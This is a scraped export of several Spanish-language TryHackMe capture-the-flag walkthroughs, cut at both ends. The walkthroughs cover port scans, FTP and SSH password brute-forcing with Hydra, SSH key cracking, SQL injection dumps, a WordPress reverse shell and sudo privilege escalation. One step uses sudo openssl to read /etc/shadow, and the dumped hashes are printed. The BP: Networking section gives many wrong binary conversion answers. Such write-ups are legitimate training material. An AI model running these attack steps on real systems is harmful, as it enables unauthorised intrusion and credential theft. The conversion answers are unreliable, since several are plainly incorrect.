SF:uest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie,67,\u0026#34;HTTP/1 SF:\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset SF:=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TLSSess SF:ionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/ SF:plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Re SF:quest\u0026#34;)%r(Kerberos,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Ty SF:pe:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\ SF:x20Bad\\x20Request\u0026#34;)%r(LPDString,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\ SF:r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20clos SF:e\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(LDAPSearchReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x SF:20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nCo SF:nnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(SIPOptions,67,\u0026#34;HTTP SF:/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20chars SF:et=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 10 17:01:09 2020 -- 1 IP address (1 host up) scanned in 671.62 seconds   HTTP Encontramos una pagina web en el puerto 80.\nAl revisar las hojas de estilo de la pagina, encontramos una flag.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10  root@upset:~/thm/kothhacker# gobuster dir -u http://kothhacker.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /backdoor (Status: 301) /contact (Status: 301) /img (Status: 301) /index.html (Status: 301) /index.html (Status: 301) /news (Status: 301) /robots.txt (Status: 200) /robots.txt (Status: 200) /staff (Status: 301)   Vemos que en backdoor existe un formulario de autenticacion.\nRevisamos el codigo fuente de esta pagina y encontramos un archivo javascript que realiza la autenticacion y que si esta es correcta redirige hacia otra pagina.\n1 2 3 4 5 6 7  if (statusOrCookie=== \u0026#34;Incorrect credentials\u0026#34;) { alert(\u0026#34;Incorrect Credentials\u0026#34;) passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/backdoor/shell\u0026#34; }   /backdoor/shell es la pagina a la que nos redirige, analizamos la pagina y vemos que al visitarla nos redirige nuevamente al /, por lo que solo podemos leer el codigo fuente, en este ultimo encontramos un archivo Javascript en donde nuevamente verifica la auntenticacion con una cookie. Pero lo interesante es de que contiene un formulario en donde se pueden \u0026ldquo;ejecutar comandos\u0026rdquo; y lo hace mediante una api.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  async function runCommand(commandText) { if (commandText === \u0026#34;exit\u0026#34;) { Cookies.set(\u0026#34;SessionToken\u0026#34;,\u0026#34;\u0026#34;) window.location = \u0026#34;/\u0026#34; return } const outputBox = document.getElementById(\u0026#34;outputBox\u0026#34;); if (commandText === \u0026#34;clear\u0026#34;) { outputBox.textContent = \u0026#34;\u0026#34; return } outputBox.textContent += \u0026#34;plague@gibson:$ \u0026#34; + commandText + \u0026#34;\\n\u0026#34; outputBox.textContent += await (await postData(\u0026#34;/api/cmd\u0026#34;, commandText)).text() window.scrollBy(0, 1000); }   FTP Utilizamos las \u0026ldquo;credenciales\u0026rdquo; de anonymous (anonymous:anonymous) para ingresar por el servicio FTP, en donde logramos encontrar dos archivos, el primero contiene una flag y el segundo una nota.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 Apr 30 04:42 . drwxr-xr-x 2 ftp ftp 4096 Apr 30 04:42 .. -rw-r--r-- 1 ftp ftp 38 Apr 30 04:42 .flag -rw-r--r-- 1 ftp ftp 400 Apr 29 03:57 note 226 Directory send OK. ftp\u0026gt; get .flag local: .flag remote: .flag 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for .flag (38 bytes). 226 Transfer complete. 38 bytes received in 0.00 secs (189.3336 kB/s) ftp\u0026gt; get note local: note remote: note 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note (400 bytes). 226 Transfer complete. 400 bytes received in 0.00 secs (3.4060 MB/s) ftp\u0026gt; exit 221 Goodbye. root@upset:~/thm/kothhacker# cat note Note: Any users with passwords in this list: love sex god secret will be subject to an immediate disciplinary hearing. Any users with other weak passwords will be complained at, loudly. These users are: rcampbell:Robert M. Campbell:Weak password gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password Exposing the company\u0026#39;s cryptographic keys is a disciplinary offense. Eugene Belford, CSO root@upset:~/thm/kothhacker#   RCAMPBELL - SSH/HYDRA En la nota encontramos dos nombres de usuario en donde mencionan que tienen contraseñas debiles. Creamos un archivo de texto (users.txt) para utilizarlo junto con Hydra en el servicio ssh con el wordlist rockyou, y logramos obtener la contraseña para el usuario rcampbell y además el usuario gcrawford al parecer no tiene activado el acceso por este servicio.\nLogramos obtener una shell con el usuario rcampbell y una flag.\nRevisando los archivos FTP de configuracion encontramos otra flag.\nNo logramos encontrar ningun archivo que nos ayudara para escalar privilegios por lo que utilizamos nuevamente HYDRA con los usuarios encontrados en el servicio FTP. Logramos encontrar la misma contraseña para rcampbell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): rcampbell 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 4 ftp ftp 4096 Jul 10 22:39 . drwxr-x--- 4 ftp ftp 4096 Jul 10 22:39 .. lrwxrwxrwx 1 ftp ftp 9 Apr 30 01:33 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ftp ftp 220 Apr 29 03:58 .bash_logout -rw-r--r-- 1 ftp ftp 3771 Apr 29 03:58 .bashrc drwx------ 2 ftp ftp 4096 Jul 10 22:16 .cache -r-------- 1 ftp ftp 38 Apr 30 04:44 .flag drwx------ 3 ftp ftp 4096 Jul 10 22:16 .gnupg -rw-r--r-- 1 ftp ftp 807 Apr 29 03:58 .profile 226 Directory send OK.   GCRAWFORD - FTP/HYDRA Utilizamos nuevamente HYDRA pero esta vez con el usuario gcrawford en donde logramos obtener una contraseña para el servicio FTP.\nIngresamos al servicio y encontramos la clave privada y publica SSH de este usuario, además encontramos un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  root@upset:~/thm/kothhacker# ftp kothhacker.thm Connected to kothhacker.thm. 220-Ellingson Mineral Company FTP Server 220- 220-WARNING 220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986 220 Name (kothhacker.thm:root): gcrawford 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-x--- 6 ftp ftp 4096 Apr 30 04:25 . drwxr-x--- 6 ftp ftp 4096 Apr 30 04:25 .. lrwxrwxrwx 1 ftp ftp 9 Apr 30 01:31 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 ftp ftp 220 Apr 29 04:00 .bash_logout -rw-r--r-- 1 ftp ftp 3771 Apr 29 04:00 .bashrc drwx------ 2 ftp ftp 4096 Apr 29 17:05 .cache drwx------ 3 ftp ftp 4096 Apr 29 17:05 .gnupg drwxrwxr-x 3 ftp ftp 4096 Apr 29 20:53 .local -rw-r--r-- 1 ftp ftp 807 Apr 29 04:00 .profile drwx------ 2 ftp ftp 4096 Jul 10 21:07 .ssh -r-------- 1 ftp ftp 252 Apr 30 04:25 business.txt 226 Directory send OK. ftp\u0026gt; cd .ssh 250 Directory successfully changed. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 398 Jul 10 21:07 authorized_keys -rw------- 1 ftp ftp 1766 Jul 10 21:07 id_rsa -rw-r--r-- 1 ftp ftp 398 Jul 10 21:07 id_rsa.pub 226 Directory send OK. ftp\u0026gt; get id_rsa local: id_rsa remote: id_rsa 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for id_rsa (1766 bytes). 226 Transfer complete. 1766 bytes received in 0.00 secs (2.2396 MB/s) ftp\u0026gt; cd .. 250 Directory successfully changed. ftp\u0026gt; get business.txt local: business.txt remote: business.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for business.txt (252 bytes). 226 Transfer complete. 252 bytes received in 0.00 secs (1.7935 MB/s) ftp\u0026gt; exit 221 Goodbye.   El archivo de texto contiene una flag.\nIntentamos autenticarnos con el archivo id_rsa en el servicio SSH pero al parecer el archivo esta protegido por una frase.\n1 2 3 4 5 6 7  root@upset:~/thm/kothhacker# ssh gcrawford@kothhacker.thm -i id_rsa Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Enter passphrase for key \u0026#39;id_rsa\u0026#39;: gcrawford@kothhacker.thm: Permission denied (publickey). root@upset:~/thm/kothhacker#   Utilizamos ssh2john para obtener el hash del archivo -id_rsa- y crackeamos el hash con john.\nLogramos obtener la frase y logramos obtener una shell con el usuario gcrawford.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando nano con el archivo bussines.txt. Utilizamos nano para obtener una shell root.\nLogramos obtener una flag en /root/.\nAgregamos nuestra clave publica al archivò authorized_keys e ingresamos con el usuario root en el servicio ssh.\nBuscamos la flag en el directorio /home y logramos encontrar las dos ultimas en /home/tryhackme/.flag y /home/production/.flag.\nPLAGUE - API/HYDRA En una de las paginas principales y en robots.txt encontramos un comentario que hacen enfasis en plague. Utilizamos Hydra y en donde el parametro usuario utilizamos plage.\nUtilizamos Hydra para intentar logearnos en /backdoor/shell, logramos encontrar la contraseña para plague.\nLogramos autenticarnos y ejecutar comandos.\nYa que podemos ejecutar comandos vamos a obtener una shell inversa.\nHacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando openssl. Utilizamos GTFOBINS para leer el archivo /etc/shadow.\n1 2  LFILE=/etc/shadow /usr/bin/sudo /usr/bin/openssl enc -in \u0026#34;$LFILE\u0026#34;   Logramos obtener el contenido, las contraseñas encriptadas.\n1 2 3 4 5  tryhackme:$6$m6t6Wwb.Irn8qFzm$LJ8sBnQX6.XDyqjQuL0XVoVSOXyRlcugWjbp3cN80Xl9344moBmQ/XdQfO2w5Oub4Kz0eBFG4KeP..05hFh171:18378:0:99999:7::: production:$6$CMJF8CIY$aq3ycncJkhhTa6h6vgec5Dr53cKJmQ.9Fa.7ZceaolrIr0B5DDKHZfV97GI0puAfrD.hCt0ZOBqtbt/RT/1TV.:18381:0:99999:7::: ftp:*:18381:0:99999:7::: rcampbell:$6$OlVRVXBb$5toooBVqa93gBtUncQNyMHeKvMdy.Wtr9eukllbmOv7wd8X.LaQR/tTYK9D1BCFSVGI3Pr/dD4U08d/8wNwES1:18453:0:99999:7::: gcrawford:$6$PujyDO0o$/TQMT0PNSCO.1qavpm26sCu9TAt.OTvjhQrXYVY5S.MNUg6XE0pxHnB3lRqfZEYo1Vjvyo8TY6CTE3FH/vzXL1:18453:0:99999:7:::   ","description":"","id":12,"section":"posts","tags":["linux"],"title":"TryHackMe - KoTH Hackers","uri":"https://sckull.github.io/posts/kothhacker/"},{"content":"uopeasy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo uopeasy     Puntos 360   Dificultad Media   Maker ben    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto smb (445), ldap (139) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # Nmap 7.80 scan initiated Mon Jul 6 22:53:12 2020 as: nmap -sV -o nmap_scan_mini uopeasy.thm Nmap scan report for uopeasy.thm (10.10.106.78) Host is up (0.16s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 443/tcp open ssl/ssl Apache httpd (SSL-only mode) 8080/tcp open http Apache httpd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 6 22:53:55 2020 -- 1 IP address (1 host up) scanned in 43.52 seconds # Nmap 7.80 scan initiated Mon Jul 6 22:53:19 2020 as: nmap -sV -p- -T5 -o nmap_scan uopeasy.thm Warning: 10.10.106.78 giving up on port because retransmission cap hit (2). Nmap scan report for uopeasy.thm (10.10.106.78) Host is up (0.18s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 443/tcp open ssl/ssl Apache httpd (SSL-only mode) 8080/tcp open http Apache httpd 11930/tcp filtered unknown 48235/tcp filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 6 22:57:59 2020 -- 1 IP address (1 host up) scanned in 279.92 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/thm/uopeasy# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://uopeasy.thm/ -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /login.php (Status: 200) /phpmyadmin (Status: 301) /server-status (Status: 403)   HTTPS Encontramos una pagina web en el puerto 443 con una url que redirecciona a wordpress. La pagina que aparece en este puerto es la misma que la del puerto 8080.\nUtilizamos gobuster nuevamente para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/thm/uopeasy# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://uopeasy.thm/ -q -t 25 -x php,html,txt -k /cgi-bin/.html (Status: 403) /favicon.ico (Status: 200) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /wordpress (Status: 301)   SQLi SQLMAP Capturamos los datos en la pagina /login.php con burpsuite y utilizamos sqlmap para verificar si podemos realizar inyeccion sql.\nLobramos obtener las bases de datos y al parecer utiliza una base de datos MySQL.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  available databases [7]: [*] information_schema [*] login [*] mysql [*] performance_schema [*] phpmyadmin [*] users [*] wordpress8080 Database: login Table: users [2 entries] +----------+-----------+ | password | user_name | +----------+-----------+ | password | candyshop | | PopRocks | Sir | +----------+-----------+ Database: wordpress8080 Table: users [1 entry] +----------+---------------------+ | username | password | +----------+---------------------+ | admin | S[... snip ... ]d | +----------+---------------------+   DAEMON - USER Utilizamos las credenciales de la base de datos ingresar en wordpress.\nEditamos el archivo 404.php para agregar una shell inversa.\nLogramos obtener una shell con el usuario Deamon.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion de archivos, y en el archivo login.php encontramos nuevamente una contraseña, utilizamos esta con el usuario root y logramos obtener una shell con root.\nLas mismas credenciales para root nos permiten ingresar a phpmyadmin.\n","description":"","id":13,"section":"posts","tags":["linux"],"title":"TryHackMe - uopeasy","uri":"https://sckull.github.io/posts/uopeasy/"},{"content":"BP: Networking es una serie de retos de TryHackMe.\n Informacion de la Maquina    Titulo BP: Networking     Info Part of the Blue Primer series, learn the basics of networking   Maker DarkStar7471    Kinda like a street address, just cooler. Todas las computadoras tienen una direccion ip. Aca se definen los diferentes tipos de direcciones IP.\n  Clases de direcciones IP\n   Clase Rango     Clase A 1-127   Clase B 128-191   Clase C 192-223   Clase D 224-239   Clase E 240-255    Espacio de direcciones privadas\n   Clase Rango     Clase A 10.0.0.0   Clase B 172.16.0.0 a 172.31.255.255   Clase C 192.168.0.0 a 192.168.255.255    SPOILER WARNING  RESPUESTAS - SPOILER WARNING How many categories of IPv4 addresses are there?\n5 - Existen 5 clases de direcciones IP\n*Which type is for research? Looking for a letter rather than a number here\nE - Esta clase IP está reservado para fines experimentales sólo para R\u0026amp;D o estudio.\nHow many private address ranges are there?\n3 - Existen 3 clases de direcciones IP Privadas\nWhich private range is typically used by businesses?\nA - Clase privada\nThere are two common default private ranges for home routers, what is the first one?\n192.168.0.0 - Comunmente utilizada para routers de casa.\nHow about the second common private home range?\n192.168.1.0- Comunmente utilizada para routers de casa.\nHow many addresses make up a typical class C range? Specifically a /24\n256 - 254 + 2 (reservadas)\nOf these addresses two are reserved, what is the first addresses typically reserved as?\nnetwork\nThe very last address in a range is typically reserved as what address type?\nbroadcast - **172.31.255.255 Ejemplo **\nA third predominant address type is typically reserved for the router, what is the name of this address type?\ngateway - gateway\nWhich address is reserved for testing on individual computers?\n127.0.0.1 - localhost\nA particularly unique address is reserved for unroutable packets, what is that address? This can also refer to all IPv4 addresses on the local machine.\n0.0.0.0 - 0.0.0.0\n Binary to Decimal   En esta parte debemos de realizar la conversion de binario a Decimal, para hacer esto utilizamos la siguiente tabla:\n   128 64 32 16 8 4 2 1    Para poder convertir de binario a decimal (utilizando la tabla) ordenamos los numeros (0\u0026rsquo;s y 1\u0026rsquo;s) de tal forma que queden ordenados con los valores de arriba. Si el numero es 1 tomamos el numero, si es 0, no.\n   128 64 32 16 8 4 2 1     1 0 0 1 0 0 1 0    Si el numero es 1 tomamos el numero, si es 0, no.\n   Numeros Guia 128 64 32 16 8 4 2 1     Binario 1 0 0 1 0 0 1 0   Decimal 128 0 0 16 0 0 2 0    Ahora que tenemos los numeros, sumamos todos (no es necesario tomar los 0\u0026rsquo;s) y obtenemos el resultado:\n   128+0+0+16+0+0+2+0 = 146    Realizamos lo mismo para todos los numeros.\nSPOILER WARNING  RESPUESTAS - SPOILER WARNING 1001 0010 = 128+16+2 = 146 0111 0111 = 64+32+16+4+2+1 = 119 1111 1111 = 128+64+32+16+8+4+2+1 = 255 1100 0101 = 128+64+4+1 = 197 1111 0110 = 128+64+32+16+4+2 = 246 0001 0011 = 16+2+1 = 19 1000 0001 = 128+1 = 129 0011 0001 = 32+16+1 = 49 0111 1000 = 64+32+16+8 = 120 1111 0000 = 128+64+32+16 = 240 0011 1011 = 32+16+8+2+1 = 59 0000 0111 = 4+2+1 = 7  Decimal to Binary     Para convertir de decimal a Binario, tomamos el numero y lo dividimos dentro de 2, hasta llegar a su minima expresion (0). Si el resultado o numero es par entonces colocamos 0 si es impar 1. El primer número quedaria de la siguiente forma:\n238 = 238 -----\u0026gt; 0 238 / 2 = 119 -----\u0026gt; 1 119 / 2 = 59 -----\u0026gt; 1 59 / 2 = 29 -----\u0026gt; 1 29 / 2 = 14 -----\u0026gt; 0 14 / 2 = 7 -----\u0026gt; 1 7 / 2 = 3 -----\u0026gt; 1 3 / 2 = 1 -----\u0026gt; 1 El resultado se lee de abajo hacia arriba: 1110 1110.\nRealizamos lo mismo para todos los numeros.\nSPOILER WARNING  RESPUESTAS - SPOILER WARNING 1 2 3 4 5 6 7 8 9 10 11  34 = 0100 1000 123 = 0111 1011 50 = 0011 0010 255 = 01111 1111 200 = 0110 0100 10 = 0101 0000 138 = 0100 0101 1 = 0000 0001 13 = 0000 1101 250 = 0111 1101 114 = 0111 0010    Address Class Identification  En esta seccion se necesita identificar a la clase que pertenece la IP dada utilizando la tabla.\nClases de direcciones IP\n   Clase Rango     Clase A 1-127   Clase B 128-191   Clase C 192-223   Clase D 224-239   Clase E 240-255    Espacio de direcciones privadas\n   Clase Rango     Clase A 10.0.0.0   Clase B 172.16.0.0 a 172.31.255.255   Clase C 192.168.0.0 a 192.168.255.255    SPOILER WARNING  RESPUESTAS - SPOILER WARNING 1 2 3 4 5 6 7 8 9 10 11 12  10.240.1.1 = A 150.10.15.0 = B 192.14.2.0 = C 148.17.9.1 = B 193.42.1.1 = C 126.8.156.0 = A 220.200.23.1 = C 230.230.45.58 = D 177.100.18.4 = B 119.18.45.0 = A 117.89.56.45 = A 215.45.45.0 = C   Obtener respuestas de Forma Facil\n Links de ayuda\nDirección IP\nIPv4 - Direcciones Reservadas\ncommon router default DHCP IP address ranges?\n","description":"","id":14,"section":"posts","tags":["challenge"],"title":"TryHackMe - BP: Networking","uri":"https://sckull.github.io/posts/bpnetworking/"},{"content":"Year of the Rabbit es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Year of the Rabbit     Info Time to enter the warren\u0026hellip;   Puntos 310   Dificultad Facil   Maker MuirlandOracle    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  # Nmap 7.80 scan initiated Sun Jun 28 21:19:18 2020 as: nmap -sV -o nmap_scan_mini rabbit.thm Nmap scan report for rabbit.thm (10.10.93.147) Host is up (0.22s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) 80/tcp open http Apache httpd 2.4.10 ((Debian)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 28 21:19:55 2020 -- 1 IP address (1 host up) scanned in 36.98 seconds # Nmap 7.80 scan initiated Sun Jun 28 21:19:17 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan rabbit.thm Nmap scan report for rabbit.thm (10.10.93.147) Host is up (0.17s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.2 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA) | 2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA) | 256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA) |_ 256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Apache2 Debian Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jun 28 21:35:05 2020 -- 1 IP address (1 host up) scanned in 947.91 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5  root@upset:~/thm/yearoftherabbit# gobuster dir -u http://rabbit.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   En el directorio assets encontramos dos archivos, un archivo mp4 y una hoja de estilos (CSS).\nEn la hoja de estilos encontramos una direccion hacia una pagina.\nAl visitar la pagina nos redirige hacia un video de youtube, desactivamos javascript en nuestro navegador y vemos un video incrustado en la pagina, es el mismo que se encuentra en /assets/.\nUtilizamos BurpSuite y encontramos que realiza una peticion a una pagina con un parametro de un directorio.\nIntentamos realizar detectar alguna vulnerabilidad en esta pagina y su parametro pero no encontramos alguno. Ya que indica un directorio, utilizamos este en la pagina y encontramos una imagen.webp.\nFTP - USER Descargamos la imagen y revisamos las strings dentro de esta, encontramos un mensaje con una lista de posibles contraseñas de un usuario en el servicio ftp.\nUtilizamos HYDRA con el usuario y wordlist encontrado en el servicio ftp y logramos encontrar las credenciales.\nDentro, encontramos un archivo txt. Que al revisarlo encontramos que esta en el lenguaje brainfuck.\nUSER - ELI Utilizamos un dcode.fr para obtener en texto plano el mensaje, en donde encontramos unas credenciales.\nUtilizamos las credenciales en el servicio SSH y obtenemos una shell.\nUSER - GWENDOLINE Al entrar a este servicio nos muestra un mensaje de root para Gwendoline.\nBuscamos el lugar \u0026ldquo;s3cr3t\u0026rdquo; y encontramos un archivo donde está la contraseña de Gwendoline.\nUtilizamos la contraseña para elevar a Gwendoline y obtenemos nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando vi en el archivo user.txt.\nIntentamos utilizar el comando con sudo pero no nos permitió.\nVerificamos la version de sudo, buscamos un exploit/vulnerabilidad relacionado y vemos sudo 1.8.27 - Security Bypass, intentamos utilizar este \u0026ldquo;exploit\u0026rdquo;, logramos ejecutar vi con sudo, obtener una shell root utilizando :!sh en vi y nuestra flag root.txt.\n","description":"","id":15,"section":"posts","tags":["linux"],"title":"TryHackMe - Year of the Rabbit","uri":"https://sckull.github.io/posts/yearoftherabbit/"},{"content":"Break Out The Cage es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Break Out The Cage     Room Break Out The Cage   Info Help Cage bring back his acting career and investigate the nefarious goings on of his agent!   Puntos 240   Dificultad Facil   Maker Magna    NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Sat Jun 27 22:24:17 2020 as: nmap -sV -o nmap_scan_mini breakthecage.thm Nmap scan report for breakthecage.thm (10.10.15.25) Host is up (0.16s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 22:25:00 2020 -- 1 IP address (1 host up) scanned in 43.71 seconds # Nmap 7.80 scan initiated Sat Jun 27 22:24:15 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan breakthecage.thm Nmap scan report for breakthecage.thm (10.10.15.25) Host is up (0.15s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 396 May 25 23:33 dad_tasks | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.8.6.160 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA) | 256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA) |_ 256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Nicholas Cage Stories Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 22:50:38 2020 -- 1 IP address (1 host up) scanned in 1582.44 seconds   HTTP Encontramos una pagina web en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7  root@upset:~/thm/breakoutthecage# gobuster dir -u http://breakthecage.thm/ -w 